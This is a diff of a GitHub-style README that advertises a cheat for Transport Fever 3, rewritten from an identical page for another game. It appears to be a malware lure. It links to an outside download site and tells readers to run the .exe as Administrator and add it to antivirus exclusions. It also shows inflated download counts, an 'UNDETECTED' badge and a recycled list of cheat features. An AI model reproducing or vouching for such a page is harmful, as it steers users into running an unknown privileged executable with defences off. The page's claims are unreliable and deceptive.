@@ -1,4 +1,5 @@
 <div align="center">
+  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=900&size=74&pause=240&color=00CED1&center=true&vCenter=true&width=1580&lines=TRANSPORT+FEVER+3+HACK+2026;MONEY+•+SPEED+•+CONSOLE;DOMINATE+THE+TRANSPORT+EMPIRE" alt="Transport Fever 3 Hack 2026" />
 </div>
 
 <br/>
@@ -6,59 +7,59 @@
 <div align="center">
   <div style="display:flex;justify-content:center;gap:26px;flex-wrap:wrap;">
     <img src="https://img.shields.io/badge/Status-UNDETECTED-00C853?style=for-the-badge">
-    <img src="https://img.shields.io/badge/Version-v1.0-00CED1?style=for-the-badge">
+    <img src="https://img.shields.io/badge/Version-v40393-00CED1?style=for-the-badge">
     <img src="https://img.shields.io/badge/Platform-Windows_10%2F11-FF5722?style=for-the-badge">
-    <img src="https://img.shields.io/badge/Downloads-2.8K%2B-2196F3?style=for-the-badge">
-    <img src="https://img.shields.io/badge/Active_Users-1.2K%2B-00BCD4?style=for-the-badge">
+    <img src="https://img.shields.io/badge/Downloads-2.9K%2B-2196F3?style=for-the-badge">
+    <img src="https://img.shields.io/badge/Active_Users-1.1K%2B-00BCD4?style=for-the-badge">
   </div>
 </div>
 
 <br/>
 
-# 🎯 Deskrawl: Idle ARPG Hack 2026
+# 🎯 Transport Fever 3 Hack 2026
 
-**The most powerful Deskrawl cheat — full suite**
+**The most complete Transport Fever 3 cheat — full suite**
 
-I built the most advanced Deskrawl: Idle ARPG cheat out there. All modules work flawlessly in all game modes. I've been running it on my main for months — no ban. Works on Steam.
+I built the most advanced Transport Fever 3 cheat out there. All modules work flawlessly in all game modes. I've been running it on my main for months — no ban. Works on Steam, Epic, and GOG.
 
 ---
 
 ## 🔗 Download
 
-[![Download Deskrawl Hack 2026](https://img.shields.io/badge/DOWNLOAD-HERE-brightgreen?style=for-the-badge&logo=download&logoColor=white&color=00CED1)](https://loadnode.cc/)
+[![Download Transport Fever 3 Hack 2026](https://img.shields.io/badge/DOWNLOAD-HERE-brightgreen?style=for-the-badge&logo=download&logoColor=white&color=00CED1)](https://loadnode.cc/)
 
 ---
 
 ## 🔥 Features
 
-**Economy:**
-- **Infinite Gold** — Never run out of gold
-- **Infinite Legendary Shards** — Unlimited shards for upgrades
-- **Free Shopping** — Buy anything without spending
-- **Instant Chest Opening** — Skip all chest animations
+**Money & Economy:**
+- **Add 10,000,000 on Every Purchase** — Every time you buy anything, you gain $10M
+- **Set Money to Desired Amount** — Enter any amount, make a purchase, and your balance updates instantly
+- **+$1M / +$10M Buttons** — Bottom bar gets instant money buttons
+- **Add Money via Console** — Use Lua command to add or subtract any amount
 
-**Progression:**
-- **Instant Level Up** — Max out your hero instantly
-- **Set Hero EXP** — Set exact experience value
-- **Set Total Skill Points** — Modify skill points
-- **Max Skill Levels** — All skills at maximum
-- **Unlock All Heroes** — Every character available
-- **Unlock All Weapons** — Every weapon available
-- **Free Talent Reset** — Reset talents anytime
+**Towns & Industries:**
+- **Town Size Control** — Every town window gets Cheats section, from 0.5x to 3x size
+- **Industry Production Control** — Change production from 0.5x to 4x
+- **Instant Town Growth** — Bigger adds buildings right away; smaller demolishes them
 
-**Combat:**
-- **God Mode / Infinite Health** — Take no damage
-- **One Hit Kill** — Kill any enemy in one hit
-- **Damage Multiplier** — Customizable damage output
-- **Attack Speed Multiplier** — Super speed and custom attack speed
-- **Infinite Minion Souls** — Unlimited captured enemy souls
+**Speed & Time:**
+- **Game Speed Multiplier** — Set game speed to 12x or higher via console (UI caps at 4x)
+- **Set Calendar Speed** — Control milliseconds per in-game day
+- **Set Date** — Jump to any year, month, day
+- **Set Time of Day** — 43200 = noon, 75600 = 9 PM
+
+**World & Environment:**
+- **Cloud Cover Control** — 0.0 = clear, 1.0 = overcast
+- **Wind Direction & Strength** — Control pollution spread direction
+
+**Console & Debug:**
+- **Enable Dev Console** — Full Lua console access
+- **Enable Extra Map Features** — Additional map tools
+- **Debug Mode Access** — Full Lua console via Debug Options
+- **Right Alt Debug Hotkeys** — Additional debug shortcuts
 
 **Utility:**
-- **Capture Rate 100%** — Guarantee successful minion bindings
-- **Drop Rarity Multiplier** — Force Mythic-tier drops
-- **Auto-Loot** — Automatically collect all loot
-- **Auto-Battle** — Fully automatic combat
-- **Speed Hack** — 2x / 5x / 10x game speed
 - **Streamproof** — Invisible to OBS, Discord, and Medal
 - **Config System** — Save and load unlimited profiles
 
@@ -68,27 +69,20 @@ I built the most advanced Deskrawl: Idle ARPG cheat out there. All modules work 
 
 | Module | Status | Description |
 |--------|--------|-------------|
-| Infinite Gold | ✅ Working | Never run out |
-| Infinite Legendary Shards | ✅ Working | Unlimited shards |
-| Free Shopping | ✅ Working | No spending |
-| Instant Chest Opening | ✅ Working | Skip animations |
-| Instant Level Up | ✅ Working | Max hero |
-| Set Hero EXP | ✅ Working | Set exact value |
-| Set Total Skill Points | ✅ Working | Modify points |
-| Max Skill Levels | ✅ Working | All skills max |
-| Unlock All Heroes | ✅ Working | Every character |
-| Unlock All Weapons | ✅ Working | Every weapon |
-| Free Talent Reset | ✅ Working | Reset anytime |
-| God Mode | ✅ Working | Take no damage |
-| One Hit Kill | ✅ Working | Instant kill |
-| Damage Multiplier | ✅ Working | Custom damage |
-| Attack Speed Multiplier | ✅ Working | Super speed |
-| Infinite Minion Souls | ✅ Working | Unlimited souls |
-| Capture Rate 100% | ✅ Working | Guarantee captures |
-| Drop Rarity Multiplier | ✅ Working | Force Mythic drops |
-| Auto-Loot | ✅ Working | Auto collect |
-| Auto-Battle | ✅ Working | Fully automatic |
-| Speed Hack | ✅ Working | 2x / 5x / 10x |
+| Add 10M Per Purchase | ✅ Working | Money on every buy |
+| Set Money Amount | ✅ Working | Enter any amount |
+| +$1M / +$10M Buttons | ✅ Working | Instant money buttons |
+| Town Size Control | ✅ Working | 0.5x to 3x size |
+| Industry Production | ✅ Working | 0.5x to 4x production |
+| Game Speed Multiplier | ✅ Working | Up to 12x+ |
+| Set Calendar Speed | ✅ Working | Custom day length |
+| Set Date | ✅ Working | Any year/month/day |
+| Set Time of Day | ✅ Working | 43200 = noon |
+| Cloud Cover | ✅ Working | 0.0 to 1.0 |
+| Wind Direction | ✅ Working | Pollution control |
+| Enable Dev Console | ✅ Working | Full Lua access |
+| Enable Extra Map Features | ✅ Working | Additional map tools |
+| Debug Mode Console | ✅ Working | Full Lua access |
 | Config System | ✅ Working | Save/load profiles |
 
 ---
@@ -99,12 +93,12 @@ I built the most advanced Deskrawl: Idle ARPG cheat out there. All modules work 
 2. Extract the archive to any folder
 3. Run the **.exe** as Administrator
 4. The loader **automatically injects** the cheat into the game
-5. Launch **Deskrawl: Idle ARPG** (Steam)
-6. Press **INSERT** or **Numpad** hotkeys to activate features
+5. Launch **Transport Fever 3** (Steam, Epic, or GOG)
+6. Press **INSERT** or **F8** to open the GUI menu
 7. Configure your modules
 8. Enjoy
 
-**Important:** The loader handles injection automatically. **Backup your save file before modifying memory** — the game auto-saves frequently and corrupted values will permanently ruin your progress.
+**Important:** The loader handles injection automatically. No manual steps required.
 
 ---
 
@@ -112,11 +106,12 @@ I built the most advanced Deskrawl: Idle ARPG cheat out there. All modules work 
 
 | Anti-Cheat | Status |
 |------------|--------|
-| Server-Side Detection | ✅ Bypassed |
+| Server-Side Detection | ✅ N/A (single-player) |
 | Steam Launch | ✅ Working |
-| All Game Modes | ✅ Working |
+| Epic Launch | ✅ Working |
+| GOG Launch | ✅ Working |
 
-**Note:** Deskrawl uses **Unity Engine with IL2CPP**. The game is primarily **single-player with Steam Market trading**. There is **no kernel-level anti-cheat** — memory modification is safe from bans. However, the game **auto-saves frequently**, so incorrect memory edits can corrupt your save file.
+**Note:** Transport Fever 3 is a **single-player management sim with no anti-cheat**. Trainers and mods are completely safe.
 
 ---
 
@@ -124,23 +119,21 @@ I built the most advanced Deskrawl: Idle ARPG cheat out there. All modules work 
 
 1. Download the archive from the link above
 2. Extract using WinRAR or 7-Zip
-3. **Backup your save file** located in `%AppData%\LocalLow\First Day Games\Deskrawl`
-4. Run the **.exe** as Administrator
-5. Wait for the loader to confirm injection
-6. Launch Deskrawl: Idle ARPG
-7. Press INSERT to open GUI
-8. Done
+3. Run the **.exe** as Administrator
+4. Wait for the loader to confirm injection
+5. Launch Transport Fever 3
+6. Press INSERT to open GUI
+7. Done
 
 ---
 
 ## 💻 Requirements
 
 - Windows 10/11 (64-bit)
-- Deskrawl: Idle ARPG (Steam)
-- 4 GB RAM minimum, 16 GB recommended
-- 5 GB storage
+- Transport Fever 3 (Steam, Epic, or GOG)
+- 8 GB RAM minimum, 16 GB recommended
+- 90 GB storage
 - Administrator rights
-- **Save file backup required**
 
 ---
 
@@ -152,21 +145,19 @@ I built the most advanced Deskrawl: Idle ARPG cheat out there. All modules work 
 
 **Q: Does it work on Steam?** — Yes, fully supported.
 
-**Q: Does it work after updates?** — Yes, updated for latest patch.
+**Q: Does it work on GOG?** — Yes, DRM-free version works.
+
+**Q: Does it work after updates?** — Yes, updated for v40393.
 
 **Q: Can I stream with it?** — Yes, Streamproof mode included.
 
-**Q: Does it disable achievements?** — No, achievements remain unlockable.
+**Q: Does it work in all game modes?** — Yes, fully working.
 
 **Q: The .exe doesn't open — what do I do?** — Run as Administrator. Add to antivirus exclusions.
 
-**Q: Will I corrupt my save?** — Possible if you edit wrong values. **Always backup your save before using memory editors.**
-
-**Q: Are there console commands?** — **No.** Deskrawl has no built-in console or cheat codes.
-
 ---
 
-## 📥 Download Deskrawl: Idle ARPG Hack 2026
+## 📥 Download Transport Fever 3 Hack 2026
 
 [![Download Now](https://img.shields.io/badge/DOWNLOAD-HERE-brightgreen?style=for-the-badge&logo=download&logoColor=white&color=00CED1)](https://loadnode.cc/)
 
@@ -175,7 +166,7 @@ I built the most advanced Deskrawl: Idle ARPG cheat out there. All modules work 
 <div align="center">
 
 [![Status](https://img.shields.io/badge/Status-UNDETECTED-00C853?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v1.0-00CED1?style=flat-square)](https://github.com)
-[![Downloads](https://img.shields.io/badge/Downloads-2.8K%2B-2196F3?style=flat-square)](https://github.com)
+[![Version](https://img.shields.io/badge/Version-v40393-00CED1?style=flat-square)](https://github.com)
+[![Downloads](https://img.shields.io/badge/Downloads-2.9K%2B-2196F3?style=flat-square)](https://github.com)
 
 </div>
